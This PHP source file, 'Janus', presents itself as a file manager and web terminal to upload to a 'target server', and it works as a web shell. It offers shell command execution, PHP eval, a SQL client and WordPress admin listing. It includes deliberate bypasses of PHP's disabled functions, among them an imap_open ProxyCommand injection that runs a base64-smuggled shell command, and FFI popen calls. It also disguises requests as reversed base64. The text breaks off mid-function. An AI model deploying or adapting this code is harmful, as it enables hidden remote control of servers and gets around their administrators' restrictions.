<?php
/**
 * Janus (janus.php) - Single-File PHP File Manager & Web Terminal.
 * Version: 1.2.8
 *
 * A high-performance, single-file PHP administration tool designed to run efficiently
 * on low-RAM servers and legacy hosting environments.
 *
 * Features:
 * - Tabbed Interface: Files manager, Server Info, Web Terminal, PHP executor, SQL client, and WP Tools.
 * - Performance & RAM Optimized: Zero external JS/CSS dependencies (native textarea editor), near-zero memory footprint.
 * - Legacy Compatibility: Programmatically refactored to support legacy PHP environments down to version 5.5.
 * - Security: Gated behind secure SHA-256 password authentication.
 *
 * Usage / Setup:
 * 1. Upload this file (rename to `janus.php` or any desired name) to your target server.
 * 2. Edit the PASSWORD constant below to configure your login credentials (default is 'admin').
 * 3. Access the file directly in your web browser (e.g., https://example.com/janus.php).
 * 4. Enter your configured password to start managing your server.
 */

// --- 1. CONFIGURATION ---
define('PASSWORD', 'admin'); // Default password, CHANGE THIS for security!
define('APP_NAME', 'Janus File Manager');

// --- 2. AUTHENTICATION & SESSION SETUP ---
$password_hash = hash('sha256', PASSWORD);
$authenticated = false;

if (isset($_COOKIE['fm_auth']) && $_COOKIE['fm_auth'] === $password_hash) {
    $authenticated = true;
}

// Helper to set toast messages

// Helper to perform redirects preserving the active tab

function set_toast($text, $type = 'success') {
    global $toast_message;
    setcookie('fm_toast', json_encode(['text' => $text, 'type' => $type]), 0, '/');
    $toast_message = ['text' => $text, 'type' => $type];
}

// Retrieve and clear toast
$toast_message = null;
if (isset($_COOKIE['fm_toast'])) {
    $toast_message = json_decode($_COOKIE['fm_toast'], true);
    setcookie('fm_toast', '', time() - 3600, '/');
}

// --- REQUEST DECRYPTION MIDDLEWARE ---
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['payload'])) {
    $decrypted_string = base64_decode(strrev($_POST['payload']));
    if ($decrypted_string !== false) {
        $parsed_params = array();
        parse_str($decrypted_string, $parsed_params);
        $_POST = $parsed_params;
    }
}

// --- 3. HANDLE AUTHENTICATION POST ACTIONS ---
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $action = (isset($_POST['action']) ? $_POST['action'] : '');
    
    if ($action === 'login') {
        $input_pass = (isset($_POST['password']) ? $_POST['password'] : '');
        if (hash('sha256', $input_pass) === $password_hash) {
            setcookie('fm_auth', $password_hash, time() + 86400 * 7, '/', '', false, true);
            set_toast('Successfully logged in!');
            header("Location: " . $_SERVER['PHP_SELF']);
            exit;
        } else {
            set_toast('Invalid password.', 'error');
            header("Location: " . $_SERVER['PHP_SELF']);
            exit;
        }
    }
    
    if ($action === 'logout') {
        setcookie('fm_auth', '', time() - 3600, '/', '', false, true);
        set_toast('Logged out.');
        header("Location: " . $_SERVER['PHP_SELF']);
        exit;
    }
}

// Block execution of core operations if not authenticated
if (!$authenticated) {
    render_login_page($toast_message);
    exit;
}

// --- 4. PATH RESOLUTION ---
$default_dir = realpath(__DIR__);
$current_abs_dir = isset($_COOKIE['fm_dir']) ? $_COOKIE['fm_dir'] : $default_dir;

if ($current_abs_dir !== '') {
    $resolved = realpath($current_abs_dir);
    if ($resolved !== false && is_dir($resolved)) {
        $current_abs_dir = $resolved;
    } else {
        $current_abs_dir = $default_dir;
    }
} else {
    $current_abs_dir = $default_dir;
}

// Helper to get safe target path for items in current directory
function get_safe_target_path($name) {
    global $current_abs_dir;
    $clean_name = basename($name);
    if ($clean_name === '' || $clean_name === '.' || $clean_name === '..') {
        return false;
    }
    return $current_abs_dir . DIRECTORY_SEPARATOR . $clean_name;
}

// WordPress Helper functions
function janus_return_empty_array() {
    return array();
}

function bootstrap_wordpress($path) {
    $wp_load = rtrim($path, '/\\') . DIRECTORY_SEPARATOR . 'wp-load.php';
    if (!file_exists($wp_load)) {
        return false;
    }
    if (defined('ABSPATH')) {
        return true;
    }
    
    // Disable WordPress's own fatal error handler so we can catch/handle errors ourselves.
    if (!defined('WP_DISABLE_FATAL_ERROR_HANDLER')) {
        define('WP_DISABLE_FATAL_ERROR_HANDLER', true);
    }
    
    // Register a custom shutdown handler to catch errors that we cannot catch via try/catch
    // (such as compile errors or fatal errors on PHP 5).
    register_shutdown_function('janus_wp_bootstrap_shutdown');
    
    // If Safe Mode is enabled, load plugin.php early and register filters to return empty array for active plugins
    $safe_mode = isset($_COOKIE['fm_wp_safe_mode']) && $_COOKIE['fm_wp_safe_mode'] === '1';
    if ($safe_mode) {
        $plugin_file = rtrim($path, '/\\') . DIRECTORY_SEPARATOR . 'wp-includes' . DIRECTORY_SEPARATOR . 'plugin.php';
        if (file_exists($plugin_file)) {
            require_once $plugin_file;
            if (function_exists('add_filter')) {
                add_filter('pre_option_active_plugins', 'janus_return_empty_array');
                add_filter('pre_site_option_active_sitewide_plugins', 'janus_return_empty_array');
            }
        }
    }
    
    define('WP_USE_THEMES', false);
    global $wp, $wp_query, $wp_the_query, $wp_rewrite, $wp_did_header, $wpdb;
    
    $old_cwd = getcwd();
    chdir(dirname($wp_load));
    
    $GLOBALS['janus_wp_bootstrapping'] = true;
    
    ob_start();
    $success = false;
    if (version_compare(PHP_VERSION, '7.0.0', '>=')) {
        // We use eval to prevent PHP 5 compiler syntax errors when using 'Throwable' catch block.
        $GLOBALS['janus_wp_load_path'] = $wp_load;
        $eval_code = '
            try {
                require_once $GLOBALS["janus_wp_load_path"];
                $GLOBALS["janus_wp_success"] = true;
            } catch (Throwable $t) {
                $GLOBALS["janus_wp_error"] = $t;
            }
        ';
        eval($eval_code);
        $success = isset($GLOBALS['janus_wp_success']) && $GLOBALS['janus_wp_success'];
        unset($GLOBALS['janus_wp_load_path'], $GLOBALS['janus_wp_success']);
    } else {
        // PHP 5.5 syntax compatibility
        try {
            require_once $wp_load;
            $success = true;
        } catch (Exception $e) {
            $GLOBALS['janus_wp_error'] = $e;
        }
    }
    ob_end_clean();
    chdir($old_cwd);
    
    $GLOBALS['janus_wp_bootstrapping'] = false;
    
    if (isset($GLOBALS['janus_wp_error'])) {
        return false;
    }
    
    return $success;
}

function janus_wp_bootstrap_shutdown() {
    if (isset($GLOBALS['janus_wp_bootstrapping']) && $GLOBALS['janus_wp_bootstrapping']) {
        $error = error_get_last();
        if ($error !== null && in_array($error['type'], array(E_ERROR, E_CORE_ERROR, E_COMPILE_ERROR, E_USER_ERROR))) {
            while (ob_get_level() > 0) {
                ob_end_clean();
            }
            echo "<div style='padding: 20px; background: #11151d; color: #f87171; border: 1px solid #ef4444; font-family: sans-serif; border-radius: 4px; margin: 20px; max-width: 800px; box-shadow: 0 4px 6px rgba(0,0,0,0.3);'>";
            echo "<h3 style='margin-top:0; color:#ef4444; font-size:18px;'>WordPress Bootstrapping Fatal Error Intercepted</h3>";
            echo "<p style='font-size:14px;color:#9ca3af;margin-bottom:15px;'>A fatal error occurred while trying to bootstrap WordPress. Below are the details:</p>";
            echo "<pre style='background:#1f2937; padding:15px; border-radius:4px; overflow-x:auto; font-family:monospace; color:#f3f4f6; font-size:13px; line-height:1.5; margin-bottom:15px; border:1px solid #2d3748;'>";
            echo "<strong>Message:</strong> " . htmlspecialchars($error['message']) . "\n";
            echo "<strong>File:</strong>    " . htmlspecialchars($error['file']) . "\n";
            echo "<strong>Line:</strong>    " . htmlspecialchars($error['line']);
            echo "</pre>";
            echo "<p style='font-size:13px;color:#9ca3af;'><em>Note: This error was triggered by your WordPress codebase (usually a plugin or theme), not Janus. You can temporarily rename the offending plugin or theme directory to bypass it.</em></p>";
            echo "<p style='margin-top:15px;'><a href='' style='display:inline-block; background:#3b82f6; color:#fff; padding:6px 12px; border-radius:4px; text-decoration:none; font-size:13px;'>&larr; Back to File Manager</a></p>";
            echo "</div>";
        }
    }
}

function get_wordpress_admins() {
    $admins = [];
    if (function_exists('get_users')) {
        $users = get_users(['role' => 'administrator']);
        foreach ($users as $user) {
            $admins[] = [
                'ID' => $user->ID,
                'user_login' => $user->user_login,
                'user_email' => $user->user_email
            ];
        }
    } else {
        global $wpdb;
        if (isset($wpdb)) {
            $query = "
                SELECT u.ID, u.user_login, u.user_email 
                FROM {$wpdb->users} u 
                INNER JOIN {$wpdb->usermeta} um ON u.ID = um.user_id 
                WHERE um.meta_key = '{$wpdb->prefix}capabilities' 
                AND um.meta_value LIKE '%administrator%'
            ";
            $results = $wpdb->get_results($query);
            if ($results) {
                foreach ($results as $user) {
                    $admins[] = [
                        'ID' => $user->ID,
                        'user_login' => $user->user_login,
                        'user_email' => $user->user_email
                    ];
                }
            }
        }
    }
    return $admins;
}

// Helper for recursive deletion
function delete_dir_recursive($dir) {
    if (!file_exists($dir)) return true;
    if (!is_dir($dir)) return unlink($dir);
    foreach (scandir($dir) as $item) {
        if ($item == '.' || $item == '..') continue;
        if (!delete_dir_recursive($dir . DIRECTORY_SEPARATOR . $item)) return false;
    }
    return rmdir($dir);
}

// Helper for recursive copying
function copy_recursive($src, $dst) {
    if (is_dir($src)) {
        if (!mkdir($dst, 0777, true) && !is_dir($dst)) {
            return false;
        }
        $files = scandir($src);
        foreach ($files as $file) {
            if ($file != "." && $file != "..") {
                if (!copy_recursive("$src/$file", "$dst/$file")) {
                    return false;
                }
            }
        }
        return true;
    } else {
        return copy($src, $dst);
    }
}

// Helper for perms string output
function get_perms_string($path) {
    $perms = @fileperms($path);
    if ($perms === false) return '????';
    
    if (($perms & 0xC000) == 0xC000) {
        $info = 's'; // Socket
    } elseif (($perms & 0xA000) == 0xA000) {
        $info = 'l'; // Symbolic Link
    } elseif (($perms & 0x8000) == 0x8000) {
        $info = '-'; // Regular
    } elseif (($perms & 0x6000) == 0x6000) {
        $info = 'b'; // Block special
    } elseif (($perms & 0x4000) == 0x4000) {
        $info = 'd'; // Directory
    } elseif (($perms & 0x2000) == 0x2000) {
        $info = 'c'; // Character special
    } elseif (($perms & 0x1000) == 0x1000) {
        $info = 'p'; // FIFO pipe
    } else {
        $info = 'u'; // Unknown
    }

    // Owner
    $info .= (($perms & 0x0100) ? 'r' : '-');
    $info .= (($perms & 0x0080) ? 'w' : '-');
    $info .= (($perms & 0x0040) ? (($perms & 0x0800) ? 's' : 'x' ) : (($perms & 0x0800) ? 'S' : '-'));

    // Group
    $info .= (($perms & 0x0020) ? 'r' : '-');
    $info .= (($perms & 0x0010) ? 'w' : '-');
    $info .= (($perms & 0x0008) ? (($perms & 0x0400) ? 's' : 'x' ) : (($perms & 0x0400) ? 'S' : '-'));

    // World
    $info .= (($perms & 0x0004) ? 'r' : '-');
    $info .= (($perms & 0x0002) ? 'w' : '-');
    $info .= (($perms & 0x0001) ? (($perms & 0x0200) ? 't' : 'x' ) : (($perms & 0x0200) ? 'T' : '-'));

    return $info;
}

// Helper to get owner:group representation of a path
function get_owner_string($path) {
    if (function_exists('posix_getpwuid')) {
        $owner_id = @fileowner($path);
        if ($owner_id !== false) {
            $user_info = @posix_getpwuid($owner_id);
            $u_name = (isset($user_info['name']) ? $user_info['name'] : $owner_id);
            
            if (function_exists('posix_getgrgid')) {
                $stat = @stat($path);
                $gid = (isset($stat['gid']) ? $stat['gid'] : false);
                if ($gid !== false) {
                    $group_info = @posix_getgrgid($gid);
                    $g_name = (isset($group_info['name']) ? $group_info['name'] : $gid);
                    return "{$u_name}:{$g_name}";
                }
            }
            return $u_name;
        }
    }
    // Fallback for Windows or systems without posix extension
    if (function_exists('fileowner')) {
        $owner_id = @fileowner($path);
        if ($owner_id !== false) {
            return (string)$owner_id;
        }
    }
    return 'unknown';
}

// Helper to find enabled command execution functions in PHP
function get_enabled_exec_methods() {
    $methods = ['shell_exec', 'exec', 'system', 'passthru', 'proc_open', 'popen'];
    $disabled = explode(',', ini_get('disable_functions'));
    $disabled = array_map('trim', $disabled);
    $disabled = array_map('strtolower', $disabled);

    $enabled = [];
    foreach ($methods as $method) {
        if (function_exists($method) && !in_array(strtolower($method), $disabled)) {
            $enabled[] = $method;
        }
    }
    
    // Bypass methods
    if (!in_array('shell_exec', $disabled) && function_exists('shell_exec')) {
        $enabled[] = 'backticks';
    }
    if (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN' && class_exists('COM')) {
        $enabled[] = 'wscript';
    }
    if (class_exists('FFI')) {
        $ffi_enable = ini_get('ffi.enable');
        if ($ffi_enable === '1' || $ffi_enable === 'true' || $ffi_enable === true || $ffi_enable === 1) {
            $enabled[] = 'ffi';
        }
    }
    if (strtoupper(substr(PHP_OS, 0, 3)) !== 'WIN' && function_exists('imap_open') && !in_array('imap_open', $disabled)) {
        $enabled[] = 'imap';
    }

    return $enabled;
}

// Helper to run shell commands using specified execution function
function run_system_cmd($cmd, $method = 'auto') {
    $enabled = get_enabled_exec_methods();
    if (empty($enabled)) {
        return [
            'output' => "Error: No command execution functions or bypass methods are enabled on this server.",
            'used' => 'none'
        ];
    }

    $methods_to_try = ($method === 'auto') ? $enabled : [$method];
    
    foreach ($methods_to_try as $m) {
        if (!in_array($m, $enabled)) {
            continue;
        }
        
        $output = '';
        $success = false;
        
        switch ($m) {
            case 'shell_exec':
                $res = @shell_exec($cmd);
                if ($res !== null && $res !== false) {
                    $output = $res;
                    $success = true;
                }
                break;
            case 'exec':
                $output_arr = [];
                @exec($cmd, $output_arr);
                $output = implode("\n", $output_arr);
                $success = true;
                break;
            case 'system':
                ob_start();
                $res = @system($cmd);
                $output = ob_get_clean();
                if ($res !== false) {
                    $success = true;
                }
                break;
            case 'passthru':
                ob_start();
                @passthru($cmd);
                $output = ob_get_clean();
                $success = true;
                break;
            case 'proc_open':
                $descriptorspec = [
                    0 => ["pipe", "r"],
                    1 => ["pipe", "w"],
                    2 => ["pipe", "w"]
                ];
                $process = @proc_open($cmd, $descriptorspec, $pipes);
                if (is_resource($process)) {
                    fclose($pipes[0]);
                    $out = stream_get_contents($pipes[1]);
                    fclose($pipes[1]);
                    $err = stream_get_contents($pipes[2]);
                    fclose($pipes[2]);
                    proc_close($process);
                    $output = $out . $err;
                    $success = true;
                }
                break;
            case 'popen':
                $handle = @popen($cmd . ' 2>&1', 'r');
                if ($handle) {
                    while (!feof($handle)) {
                        $output .= fread($handle, 4096);
                    }
                    pclose($handle);
                    $success = true;
                }
                break;
            case 'backticks':
                $res = @`$cmd`;
                if ($res !== null && $res !== false) {
                    $output = $res;
                    $success = true;
                }
                break;
            case 'wscript':
                try {
                    $wsh = new COM('WScript.Shell');
                    $exec = $wsh->Exec("cmd.exe /c " . $cmd);
                    $out = $exec->StdOut->ReadAll();
                    $err = $exec->StdErr->ReadAll();
                    $output = $out . $err;
                    $success = true;
                } catch (Exception $e) {}
                break;
            case 'ffi':
                try {
                    $ffi = FFI::cdef("void *popen(const char *command, const char *type); int pclose(void *stream); char *fgets(char *s, int size, void *stream);");
                    $stream = $ffi->popen($cmd . " 2>&1", "r");
                    if ($stream !== null) {
                        $buf = $ffi->new("char[4096]");
                        while ($ffi->fgets($buf, 4096, $stream) !== null) {
                            $output .= FFI::string($buf);
                        }
                        $ffi->pclose($stream);
                        $success = true;
                    }
                } catch (Exception $e) {}
                break;
            case 'imap':
                $payload = base64_encode($cmd . ' > /tmp/imap_cmd_out 2>&1');
                $server = "x -oProxyCommand=echo\t" . $payload . "|base64\t-d|sh}";
                @imap_open('{' . $server . 'INBOX', '', '');
                if (file_exists('/tmp/imap_cmd_out')) {
                    $output = file_get_contents('/tmp/imap_cmd_out');
                    @unlink('/tmp/imap_cmd_out');
                    $success = true;
                }
                break;
        }
        
        if ($success) {
            return [
                'output' => $output,
                'used' => $m
            ];
        }
    }
    
    return [
        'output' => "Execution failed or returned no output using method(s): " . implode(', ', $methods_to_try),
        'used' => 'failed'
    ];
}

// --- 5. DATABASE CLIENT HELPERS & STATE ---
function connect_db($data) {
    $driver = (isset($data['driver']) ? $data['driver'] : 'mysql');
    if ($driver === 'sqlite') {
        $path = (isset($data['path']) ? $data['path'] : '');
        if ($path === '') {
            throw new PDOException("SQLite path cannot be empty.");
        }
        $dsn = "sqlite:" . $path;
        $pdo = new PDO($dsn);
    } else {
        $host = (isset($data['host']) ? $data['host'] : 'localhost');
        $port = (isset($data['port']) ? $data['port'] : '3306');
        $user = (isset($data['user']) ? $data['user'] : '');
        $pass = (isset($data['pass']) ? $data['pass'] : '');
        $dbname = (isset($data['dbname']) ? $data['dbname'] : '');
        
        $dsn = "mysql:host=$host;port=$port";
        if ($dbname !== '') {
            $dsn .= ";dbname=$dbname";
        }
        $pdo = new PDO($dsn, $user, $pass, [
            PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION,
            PDO::ATTR_DEFAULT_FETCH_MODE => PDO::FETCH_ASSOC,
            PDO::ATTR_TIMEOUT => 5
        ]);
    }
    return $pdo;
}

function get_db_tables($pdo, $driver) {
    $tables = [];
    try {
        if ($driver === 'sqlite') {
            $q = $pdo->query("SELECT name FROM sqlite_master WHERE type='table' AND name NOT LIKE 'sqlite_%' ORDER BY name");
            while ($row = $q->fetch(PDO::FETCH_NUM)) {
                $tbl = $row[0];
                $count = 0;
                try {
                    $cq = $pdo->query("SELECT COUNT(*) FROM " . quote_ident($tbl, $driver));
                    if ($cq) {
                        $count = intval($cq->fetchColumn());
                    }
                } catch (Exception $e) {}
                $tables[] = [
                    'name' => $tbl,
                    'rows' => $count
                ];
            }
        } else {
            // MySQL/MariaDB: Try to query information_schema to get all table names and row counts in a single query.
            // This is extremely fast because it doesn't execute COUNT(*) on every table individually.
            $opt_query = "SELECT TABLE_NAME, TABLE_ROWS FROM information_schema.TABLES WHERE TABLE_SCHEMA = DATABASE() ORDER BY TABLE_NAME";
            $success = false;
            try {
                $q = $pdo->query($opt_query);
                if ($q) {
                    while ($row = $q->fetch(PDO::FETCH_ASSOC)) {
                        $tables[] = [
                            'name' => $row['TABLE_NAME'],
                            'rows' => intval($row['TABLE_ROWS'])
                        ];
                    }
                    $success = true;
                }
            } catch (Exception $e) {}

            // Fallback if information_schema query fails
            if (!$success) {
                $q = $pdo->query("SHOW TABLES");
                while ($row = $q->fetch(PDO::FETCH_NUM)) {
                    $tbl = $row[0];
                    $count = 0;
                    try {
                        $cq = $pdo->query("SELECT COUNT(*) FROM " . quote_ident($tbl, $driver));
                        if ($cq) {
                            $count = intval($cq->fetchColumn());
                        }
                    } catch (Exception $e) {}
                    $tables[] = [
                        'name' => $tbl,
                        'rows' => $count
                    ];
                }
            }
        }
    } catch (Exception $e) {}
    return $tables;
}

function get_db_databases($pdo) {
    $dbs = [];
    try {
        $q = $pdo->query("SHOW DATABASES");
        while ($row = $q->fetch(PDO::FETCH_NUM)) {
            $dbs[] = $row[0];
        }
    } catch (Exception $e) {}
    return $dbs;
}

function quote_ident($name, $driver) {
    if ($driver === 'sqlite') {
        return '"' . str_replace('"', '""', $name) . '"';
    } else {
        return '`' . str_replace('`', '``', $name) . '`';
    }
}

function get_table_primary_keys($pdo, $driver, $table) {
    $pks = [];
    try {
        if ($driver === 'sqlite') {
            $q = $pdo->query("PRAGMA table_info(\"" . str_replace('"', '""', $table) . "\")");
            if ($q) {
                while ($row = $q->fetch(PDO::FETCH_ASSOC)) {
                    if (isset($row['pk']) && intval($row['pk']) > 0) {
                        $pks[] = $row['name'];
                    }
                }
            }
        } else {
            $db_q = $pdo->query("SELECT DATABASE()");
            $db_name = $db_q ? $db_q->fetchColumn() : '';
            if ($db_name) {
                $q = $pdo->prepare("
                    SELECT COLUMN_NAME 
                    FROM information_schema.COLUMNS 
                    WHERE TABLE_SCHEMA = ? AND TABLE_NAME = ? AND COLUMN_KEY = 'PRI'
                ");
                $q->execute([$db_name, $table]);
                while ($col = $q->fetchColumn()) {
                    $pks[] = $col;
                }
            }
            if (empty($pks)) {
                $q_fallback = $pdo->query("SHOW KEYS FROM `" . str_replace('`', '``', $table) . "` WHERE Key_name = 'PRIMARY'");
                if ($q_fallback) {
                    while ($row = $q_fallback->fetch(PDO::FETCH_ASSOC)) {
                        if (isset($row['Column_name'])) {
                            $pks[] = $row['Column_name'];
                        }
                    }
                }
            }
        }
    } catch (Exception $e) {}
    return $pks;
}

$db_conn_str = (isset($_COOKIE['fm_db_conn']) ? $_COOKIE['fm_db_conn'] : '');
$db_conn_data = null;
$db_connected = false;
$db_error = '';
$db_query_results = null;
$db_query_info = '';
$db_sql = '';
$db_pdo = null;
$db_active_table = '';
$db_page = 1;
$db_limit = 30;
$total_rows = 0;

$active_tab = (isset($_POST['tab']) ? $_POST['tab'] : (isset($_COOKIE['fm_tab']) ? $_COOKIE['fm_tab'] : 'files'));
$valid_tabs = ['files', 'info', 'terminal', 'php', 'sql', 'wp'];
if (!in_array($active_tab, $valid_tabs)) {
    $active_tab = 'files';
}

if ($db_conn_str !== '' && $active_tab === 'sql') {
    $decoded = @base64_decode($db_conn_str);
    if ($decoded !== false) {
        $db_conn_data = @json_decode($decoded, true);
        if (is_array($db_conn_data)) {
            try {
                $db_pdo = connect_db($db_conn_data);
                $db_connected = true;
            } catch (PDOException $e) {
                $db_error = "Connection error: " . $e->getMessage();
            }
        }
    }
}

// --- 6. TABS & ACTIONS POST PROCESSING ---
$terminal_output = '';
$terminal_cmd = '';
$selected_exec_method = (isset($_COOKIE['fm_exec_method']) ? $_COOKIE['fm_exec_method'] : 'auto');
$last_used_method = (isset($_COOKIE['fm_last_exec_method']) ? $_COOKIE['fm_last_exec_method'] : '');
$php_output = '';
$php_code = '';

// WordPress auto-detection and setup
$autodetect_wp_path = '';
if (file_exists($current_abs_dir . DIRECTORY_SEPARATOR . 'wp-load.php')) {
    $autodetect_wp_path = $current_abs_dir;
} else {
    $p = dirname($current_abs_dir);
    if (file_exists($p . DIRECTORY_SEPARATOR . 'wp-load.php')) {
        $autodetect_wp_path = $p;
    } else {
        $p2 = dirname($p);
        if (file_exists($p2 . DIRECTORY_SEPARATOR . 'wp-load.php')) {
            $autodetect_wp_path = $p2;
        }
    }
}
$wp_path = (isset($_COOKIE['fm_wp_path']) ? ($_COOKIE['fm_wp_path'] === 'none' ? '' : $_COOKIE['fm_wp_path']) : $autodetect_wp_path);

$edit_mode = false;
$edit_filename = '';
$edit_content = '';

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $action = (isset($_POST['action']) ? $_POST['action'] : '');
    
    // Switch Tabs
    if ($action === 'set_tab') {
        $active_tab = (isset($_POST['tab']) ? $_POST['tab'] : 'files');
        setcookie('fm_tab', $active_tab, time() + 86400 * 30, '/');
        header("Location: " . $_SERVER['PHP_SELF']);
        exit;

    }
    
    // Connect Database
    if ($action === 'db_connect') {
        $driver = (isset($_POST['driver']) ? $_POST['driver'] : 'mysql');
        $conn_data = ['driver' => $driver];
        if ($driver === 'sqlite') {
            $conn_data['path'] = (isset($_POST['path']) ? $_POST['path'] : '');
        } else {
            $conn_data['host'] = (isset($_POST['host']) ? $_POST['host'] : 'localhost');
            $conn_data['port'] = (isset($_POST['port']) ? $_POST['port'] : '3306');
            $conn_data['user'] = (isset($_POST['user']) ? $_POST['user'] : '');
            $conn_data['pass'] = (isset($_POST['pass']) ? $_POST['pass'] : '');
            $conn_data['dbname'] = (isset($_POST['dbname']) ? $_POST['dbname'] : '');
        }
        
        try {
            $test_pdo = connect_db($conn_data);
            $encoded = base64_encode(json_encode($conn_data));
            setcookie('fm_db_conn', $encoded, time() + 86400 * 30, '/');
            setcookie('fm_tab', 'sql', time() + 86400 * 30, '/');
            set_toast('Connected to database successfully.');
        } catch (PDOException $e) {
            set_toast('Database connection failed: ' . $e->getMessage(), 'error');
        }
        header("Location: " . $_SERVER['PHP_SELF']);
        exit;

    }
    
    // Disconnect Database
    if ($action === 'db_disconnect') {
        setcookie('fm_db_conn', '', time() - 3600, '/');
        setcookie('fm_tab', 'sql', time() + 86400 * 30, '/');
        set_toast('Disconnected from database.');
        header("Location: " . $_SERVER['PHP_SELF']);
        exit;

    }

    // Select Database
    if ($action === 'db_select_database') {
        $dbname = (isset($_POST['dbname']) ? $_POST['dbname'] : '');
        if ($db_conn_str !== '') {
            $decoded = @base64_decode($db_conn_str);
            if ($decoded !== false) {
                $data = @json_decode($decoded, true);
                if (is_array($data)) {
                    $data['dbname'] = $dbname;
                    $encoded = base64_encode(json_encode($data));
                    setcookie('fm_db_conn', $encoded, time() + 86400 * 30, '/');
                    set_toast("Database selection changed to: " . ($dbname !== '' ? $dbname : '[none]'));
                }
            }
        }
        setcookie('fm_tab', 'sql', time() + 86400 * 30, '/');
        header("Location: " . $_SERVER['PHP_SELF']);
        exit;

    }
    
    // Execute Database Query
    if ($action === 'db_query') {
        $db_sql = (isset($_POST['sql']) ? $_POST['sql'] : '');
        if ($db_sql !== '') {
            $start_time = microtime(true);
            try {
                if ($db_pdo) {
                    $stmt = $db_pdo->query($db_sql);
                    $end_time = microtime(true);
                    $elapsed = $end_time - $start_time;
                    if ($stmt) {
                        $col_count = $stmt->columnCount();
                        if ($col_count > 0) {
                            $db_query_results = $stmt->fetchAll(PDO::FETCH_ASSOC);
                            $row_count = count($db_query_results);
                            $db_query_info = "Query executed successfully. Returned $row_count rows in " . number_format($elapsed, 4) . " seconds.";
                        } else {
                            $affected = $stmt->rowCount();
                            $db_query_info = "Query executed successfully. Affected rows: $affected in " . number_format($elapsed, 4) . " seconds.";
                        }
                    } else {
                        $db_error = "Unknown error executing query.";
                    }
                } else {
                    $db_error = "Database is not connected.";
                }
            } catch (PDOException $e) {
                $db_error = "SQL Error: " . $e->getMessage();
            }
        }
        setcookie('fm_tab', 'sql', time() + 86400 * 30, '/');
        $_COOKIE['fm_tab'] = 'sql';
        $active_tab = 'sql';
        $db_active_table = '';
    }

    // Save Row (Insert or Update)
    if ($action === 'db_save_row') {
        $table = (isset($_POST['table']) ? $_POST['table'] : '');
        $is_new = (isset($_POST['is_new']) && $_POST['is_new'] === '1');
        $pk_data = json_decode(isset($_POST['pk_data']) ? $_POST['pk_data'] : '{}', true);
        $fields = isset($_POST['fields']) ? $_POST['fields'] : [];
        $nulls = isset($_POST['nulls']) ? $_POST['nulls'] : [];
        $page = max(1, intval(isset($_POST['page']) ? $_POST['page'] : 1));
        
        if ($db_pdo && $table !== '') {
            try {
                if ($is_new) {
                    $cols = [];
                    $vals = [];
                    $params = [];
                    foreach ($fields as $col => $val) {
                        $cols[] = quote_ident($col, $db_conn_data['driver']);
                        if (isset($nulls[$col]) && $nulls[$col] === '1') {
                            $vals[] = "NULL";
                        } else {
                            $vals[] = "?";
                            $params[] = $val;
                        }
                    }
                    $sql = "INSERT INTO " . quote_ident($table, $db_conn_data['driver']) . " (" . implode(', ', $cols) . ") VALUES (" . implode(', ', $vals) . ");";
                    $stmt = $db_pdo->prepare($sql);
                    $stmt->execute($params);
                    set_toast("Row inserted successfully.");
                } else {
                    $sets = [];
                    $params = [];
                    foreach ($fields as $col => $val) {
                        if (isset($nulls[$col]) && $nulls[$col] === '1') {
                            $sets[] = quote_ident($col, $db_conn_data['driver']) . " = NULL";
                        } else {
                            $sets[] = quote_ident($col, $db_conn_data['driver']) . " = ?";
                            $params[] = $val;
                        }
                    }
                    
                    $wheres = [];
                    if (!empty($pk_data)) {
                        foreach ($pk_data as $col => $val) {
                            if ($val === null) {
                                $wheres[] = quote_ident($col, $db_conn_data['driver']) . " IS NULL";
                            } else {
                                $wheres[] = quote_ident($col, $db_conn_data['driver']) . " = ?";
                                $params[] = $val;
                            }
                        }
                    } else {
                        foreach ($fields as $col => $val) {
                            if ($val === null) {
                                $wheres[] = quote_ident($col, $db_conn_data['driver']) . " IS NULL";
                            } else {
                                $wheres[] = quote_ident($col, $db_conn_data['driver']) . " = ?";
                                $params[] = $val;
                            }
                        }
                    }
                    $sql = "UPDATE " . quote_ident($table, $db_conn_data['driver']) . " SET " . implode(', ', $sets) . " WHERE " . implode(' AND ', $wheres) . ";";
                    $stmt = $db_pdo->prepare($sql);
                    $stmt->execute($params);
                    set_toast("Row updated successfully.");
                }
            } catch (Exception $e) {
                set_toast("Failed to save row: " . $e->getMessage(), "error");
            }
            
            $_POST['action'] = 'db_browse';
            $_POST['table'] = $table;
            $_POST['page'] = $page;
            $action = 'db_browse';
        }
    }

    // Delete Row
    if ($action === 'db_delete_row') {
        $table = (isset($_POST['table']) ? $_POST['table'] : '');
        $pk_data = json_decode(isset($_POST['pk_data']) ? $_POST['pk_data'] : '{}', true);
        $page = max(1, intval(isset($_POST['page']) ? $_POST['page'] : 1));
        
        if ($db_pdo && $table !== '' && !empty($pk_data)) {
            try {
                $wheres = [];
                $params = [];
                foreach ($pk_data as $col => $val) {
                    if ($val === null) {
                        $wheres[] = quote_ident($col, $db_conn_data['driver']) . " IS NULL";
                    } else {
                        $wheres[] = quote_ident($col, $db_conn_data['driver']) . " = ?";
                        $params[] = $val;
                    }
                }
                $sql = "DELETE FROM " . quote_ident($table, $db_conn_data['driver']) . " WHERE " . implode(' AND ', $wheres) . ";";
                $stmt = $db_pdo->prepare($sql);
                $stmt->execute($params);
                set_toast("Row deleted successfully.");
            } catch (Exception $e) {
                set_toast("Failed to delete row: " . $e->getMessage(), "error");
            }
            
            $_POST['action'] = 'db_browse';
            $_POST['table'] = $table;
            $_POST['page'] = $page;
            $action = 'db_browse';
        }
    }

    // Browse Table
    if ($action === 'db_browse') {
        $db_active_table = (isset($_POST['table']) ? $_POST['table'] : '');
        $db_page = max(1, intval(isset($_POST['page']) ? $_POST['page'] : 1));
        
        if ($db_pdo && $db_active_table !== '') {
            try {
                $cq = $db_pdo->query("SELECT COUNT(*) FROM " . quote_ident($db_active_table, $db_conn_data['driver']));
                if ($cq) {
                    $total_rows = intval($cq->fetchColumn());
                }
            } catch (Exception $e) {}
            
            $total_pages = ceil($total_rows / $db_limit);
            if ($db_page > $total_pages && $total_pages > 0) {
                $db_page = $total_pages;
            }
            
            $offset = ($db_page - 1) * $db_limit;
            $db_sql = "SELECT * FROM " . quote_ident($db_active_table, $db_conn_data['driver']) . " LIMIT $db_limit OFFSET $offset;";
